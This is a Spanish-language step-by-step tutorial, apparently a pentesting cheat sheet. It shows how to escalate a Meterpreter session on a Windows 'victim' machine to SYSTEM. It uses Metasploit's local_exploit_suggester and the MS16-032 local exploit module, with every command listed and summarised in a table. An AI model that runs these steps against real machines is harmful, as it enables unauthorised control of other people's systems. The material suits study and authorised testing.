# Escalada de privilegios en Windows explotando el kernel con Metasploit

---

##  Tener una sesión de Meterpreter

Primero, consigue una sesión de `meterpreter` en la máquina víctima (por ejemplo, tras un exploit SMB o RDP exitoso).  
Comprueba que estás como usuario limitado:
```
whoami
```

---

##  Mandar la sesión de Meterpreter al background

Para poder lanzar módulos de reconocimiento desde Metasploit, pon la sesión en segundo plano:
```
background
```

Esto devolverá el prompt de `msfconsole` y te mostrará el número de sesión (ejemplo: `[*] Backgrounding session 1...`).

---

##  Buscar y lanzar el sugeridor de exploits locales

En `msfconsole`, busca el módulo `local_exploit_suggester`:
```
search local_exploit_suggester
```

Debería mostrar algo como:
```
post/multi/recon/local_exploit_suggester
```

Usa el módulo:
```
use post/multi/recon/local_exploit_suggester
```

Establece la sesión que acabas de mandar al background:
```
set SESSION <NÚMERO_DE_SESIÓN>
```

Ejecuta el módulo:
```
run
```

---

##  Elegir uno de los exploits sugeridos

El módulo analizará el sistema y listará posibles exploits locales disponibles.  
Por ejemplo, la salida podría sugerir:
```
[*] [Recommended] exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] exploit/windows/local/ms10_092_trusted_publisher
```

Escoge uno de los recomendados compatible con el sistema.

---

##  Ejecutar el exploit sugerido

Cárgalo en `msfconsole`:
```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

Configura la sesión que tenías:
```
set SESSION <NÚMERO_DE_SESIÓN>
```

Comprueba las opciones:
```
options
```

Ejecuta el exploit:
```
exploit
```

Si todo va bien, la sesión debería elevarse a SYSTEM.

---

## 📋 Resumen de pasos

| Paso                                      | Comando                                     |
|------------------------------------------|--------------------------------------------|
| Ver usuario actual                      | `whoami`                                   |
| Mandar sesión al background             | `background`                              |
| Buscar sugeridor de exploits locales   | `search local_exploit_suggester`         |
| Usar el módulo sugeridor                | `use post/multi/recon/local_exploit_suggester` |
| Establecer la sesión                    | `set SESSION <número>`                   |
| Ejecutar sugeridor                      | `run`                                     |
| Elegir uno de los exploits recomendados | `use exploit/windows/local/<exploit>`   |
| Ejecutar exploit                        | `exploit`                                 |

